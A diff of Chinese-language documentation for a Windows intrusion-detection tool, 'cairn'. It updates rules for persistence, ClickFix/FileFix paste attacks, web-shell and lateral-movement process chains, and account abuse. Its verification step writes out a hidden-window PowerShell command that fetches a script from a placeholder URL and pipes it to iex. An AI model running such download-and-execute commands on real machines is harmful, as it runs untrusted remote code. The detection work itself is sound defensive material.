@@ -29,7 +29,11 @@
 | T1137.002 | Office Test | Office test\Special\Perf | 有項目就報 |
 | T1037.001 | Logon Script | HKCU\Environment UserInitMprLogonScript | 有項目就報 |
 
-「只看路徑和簽章」是指 persist heuristic 的通用訊號：未簽章且位於使用者可寫入路徑、系統程式名稱出現在 Windows 目錄以外，或是近期修改且簽章無法驗證。
+「只看路徑和簽章」是指 persist heuristic 的通用訊號，一律看「實際被執行的程式」：未簽章且位於使用者可寫入路徑（High）、系統程式名稱不在它應有的目錄（例如 `C:\Windows\Temp\svchost.exe`，High）、近期修改且未簽章或簽章無法驗證（Medium）。Startup 資料夾不再例外：捷徑（.lnk）本身的位置不列入判斷，但解析出的目標程式、直接放在資料夾裡的執行檔都照樣判斷；直接放進 Startup 資料夾的腳本檔（.vbs、.js、.bat、.ps1、.hta 等）報 Medium。
+
+代理執行（T1218 / T1059）：持久化項目指向 rundll32、regsvr32、msiexec、mshta、wscript、cscript、powershell、cmd 這些已簽章的系統程式時，改看它的參數——參數是放在使用者可寫入路徑的 DLL／腳本、網路芳鄰路徑（`\\host\share`）或網址，報 High。
+
+服務的啟動類型：手動啟動（Start=3）的服務若只有一個訊號，嚴重度降一級（需要 collector 記錄啟動類型；目前尚未記錄，所以暫不生效）。
 
 嚴重度規則：有項目或非預設項目一律先算 Medium；目標未簽章、位於使用者可寫入路徑或偽裝成系統程式時升為 High。同一筆有兩個以上訊號，或對應的程式正在執行、留有執行紀錄時，會再升一級。
 
@@ -43,11 +47,15 @@
 | T1543.003 | System 7045（新安裝服務） | 指令在使用者可寫入路徑、呼叫 cmd／powershell／mshta 等，或含下載／編碼語法：High；不在 Windows 或 Program Files 下：Medium；其他：Low |
 | T1053.005 | Security 4698（新建排程工作，需開啟「其他物件存取」稽核） | 同上，看 TaskContent 裡的 Command 和 Arguments |
 | T1562.001 | Defender 5001（即時保護被關閉）、5007（新增排除項目） | 一律報 High |
-| — | Defender 1116（偵測到惡意程式） | 依威脅名稱與路徑合併成一筆，報 High |
+| — | Defender 1116（偵測到惡意程式）、1117（已處理）、1118／1119（處理失敗） | 依威脅名稱與路徑合併成一筆，附上 Defender 的處理結果。處理失敗：High；PUA／廣告軟體：已處理 Low、未見處理 Medium；其他類別：High |
 
 ## 初始入侵：ClickFix（T1204.004）
 
 假驗證碼、假錯誤頁面會要求使用者按 Win+R 貼上指令。Explorer 會把「執行」對話框輸入過的內容存在 `HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`。cairn 會讀所有已登入使用者的這個機碼：呼叫 powershell、mshta、cmd、curl 等並帶參數的報 Medium；同時含下載、編碼、網址或隱藏視窗的報 High。單純的 `cmd`、`notepad`、網路路徑不報。
+
+FileFix 是同一招的變形：假的文件分享頁面要使用者把「檔案路徑」貼到檔案總管的網址列，實際上是一串指令。Explorer 把網址列輸入過的內容存在 `...\Explorer\TypedPaths`，cairn 用同樣的規則判斷。另外，行程上 explorer.exe 直接啟動 mshta.exe 也報 High。
+
+時間：RunMRU／TypedPaths 整個機碼只有一個最後寫入時間，只代表「最近一筆」的輸入時間。其他筆的 finding 時間是收集時間，`reason` 會寫「time unknown」。
 
 驗證：在 VM 上按 Win+R 輸入 `powershell -w h -c "iwr http://example.invalid/a.ps1 | iex"`（網址不存在，不會真的下載），再執行 cairn，應該看到一筆 High 的 T1204.004。
 
@@ -57,9 +65,10 @@ Run／RunOnce、COM 劫持、登入腳本、螢幕保護程式、cmd AutoRun、R
 
 ## 其他內建偵測
 
-- 行程：Office 或腳本宿主產生 shell（T1059）、編碼或下載型 PowerShell（T1059.001）、LOLBin 帶可疑參數（T1218）、系統程式名稱偽裝（T1036.005）。
-- 網路：連線所屬程式未簽章且位於可疑路徑（T1036），若該程式同時有持久化項目會升級。
-- 帳號（Security 記錄）：建立帳號（T1136.001）、加入群組（T1098.007）、刪除帳號（T1531）、密碼猜測與噴灑（T1110.001／T1110.003）。
+- 行程（父→子）：Office 或腳本宿主產生 shell（T1059）、編碼或下載型 PowerShell（T1059.001）、LOLBin 帶可疑參數（T1218）；explorer.exe → mshta.exe（ClickFix，T1204.004，High）；w3wp／sqlservr／httpd／nginx／Tomcat → cmd／powershell／whoami（web shell，T1505.003，High）；wmiprvse.exe → cmd／powershell（T1047，Medium；輸出寫到 `\\127.0.0.1\ADMIN$` 的 wmiexec 特徵升為 Critical）；services.exe → 寫到 `\\127.0.0.1\ADMIN$` 的 cmd.exe 或 PSEXESVC（T1569.002，High）。系統程式名稱（svchost、lsass、csrss、services、winlogon、explorer、rundll32、dllhost、taskhostw 等）不在應有目錄就報 High（T1036.005），即使在 `C:\Windows` 底下也一樣。每種組合都有自己的說明文字，不再用籠統的「可能為偽裝或橫向移動」。
+- 網路：連線所屬程式未簽章且位於可疑路徑（T1036），單獨出現報 Medium，再加上其他訊號（少見埠、監聽高埠、該程式有持久化項目）升為 High 以上；公網 IP 連進本機 RDP（3389）、SMB（445）、SSH（22）的連線報 High（T1021.001／.002／.004、T1133）。
+- 帳號（Security 記錄）：建立帳號（T1136.001）、刪除帳號（T1531）；加入群組（4728／4732／4756，T1098.007）——Administrators、Domain Admins、Enterprise Admins、Remote Desktop Users、Backup Operators 報 High，其他群組 Low，說明會寫出「誰把誰加進哪個群組」，已被 Sigma 規則報過的同一筆事件不重複；帳號啟用（4722）、被其他帳號重設密碼（4724）、帳號安全旗標被打開（4738：不需要密碼、密碼永不過期、可逆加密、委派、不需 Kerberos 預先驗證等）報 Medium（T1098）。
+- 密碼猜測與噴灑（T1110.001／T1110.003）：只算 4625（以及 4771、4776）中真正屬於猜錯的失敗——密碼錯誤、帳號不存在、帳號被鎖定；不算服務／批次登入（LogonType 0／4／5）、本機來源（`-`、127.0.0.1、::1）、DWM-／UMFD- 帳號。「猜中」要在失敗之後，同一來源出現 4624 網路（type 3）或遠端桌面（type 10）登入成功。
 - Sigma：80 條規則，前提是對應的記錄有開啟（Sysmon、4688 含命令列、PowerShell 4104）。實際各技術的規則數請看 `cairn coverage`。
 
 ## 怎麼驗證（在實驗用 VM 上，不要在客戶主機上）
